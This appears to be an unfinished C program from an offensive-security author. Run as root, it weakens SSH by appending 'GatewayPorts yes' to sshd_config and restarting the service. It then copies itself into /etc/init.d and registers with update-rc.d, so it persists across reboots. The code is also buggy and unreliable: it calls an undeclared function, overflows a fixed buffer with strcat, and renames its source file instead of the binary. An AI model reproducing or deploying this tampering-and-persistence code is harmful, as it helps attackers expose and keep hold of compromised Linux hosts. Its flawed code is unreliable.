#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <string.h>
#include <sys/stat.h>

//Remote Port Fowarding//
//Coded By B3mB4m
//Do not test yet.

int sshd();
int restartssh();
int startup();


//http://blog.trackets.com/2014/05/17/ssh-tunnel-local-and-remote-port-forwarding-explained-with-examples.html
//There is one more thing you need to do to enable this. 
//SSH doesn’t by default allow remote hosts to forwarded ports. 
//To enable this open /etc/ssh/sshd_config and add the following line somewhere in that config file.
//GatewayPorts yes

//Therefore, not working any Remote port forwarding shellcode.Dont be skid.


int main(int argc, char const *argv[]){
	if(geteuid() != 0){exit(0);}
	else{
		//Fork, because execve completely spawn new process.
		//So, fork prevent close our orjinal process.
		pid_t pid;
		pid = fork();
		if(pid >= 0){
			if(pid == 0){ 
				sshdwrite();
				startup();
			}
			else{
				sleep (10); 
				restartssh();

			}

		}
		else{exit(0);}
	}


}

int sshdwrite(){
	//r  - open for reading
	//w  - open for writing (file need not exist)
	//a  - open for appending (file need not exist)
	//r+ - open for reading and writing, start at beginning
	//w+ - open for reading and writing (overwrite file)
	//a+ - open for reading and writing (append if file exists)
	FILE *fp;
	char sshd_config[] = "GatewayPorts yes\n";
    fp = fopen("/etc/ssh/sshd_config", "a+");
    fprintf(fp, sshd_config);
    fclose(fp);
    return 1;

}

int restartssh(){
	//execve(const char *path, char *const argv[], char *const envp[]);
    char *args[] = {"/etc/init.d/ssh", "restart",  NULL};
    char *env[] = {NULL};
    execve("/etc/init.d/ssh", args, NULL);
}

int startup(){
	int retvalue;
	char newname[] = "/etc/init.d/";
	strcat(newname, __FILE__);
	//int rename(const char *old_filename, const char *new_filename) 
	retvalue = rename(__FILE__, newname);
	if (retvalue == 0){
		//http://pubs.opengroup.org/onlinepubs/009695399/functions/chmod.html
		chmod(newname, S_IRWXU);
		char *args[] = {"/usr/sbin/update-rc.d", newname, "defaults",  NULL};
    	char *env[] = {NULL};
   		execve("/usr/sbin/update-rc.d", args, NULL);
	}
	//sudo mv /filename /etc/init.d/
	//sudo chmod +x /etc/init.d/filename 
	//sudo update-rc.d filename defaults 
}
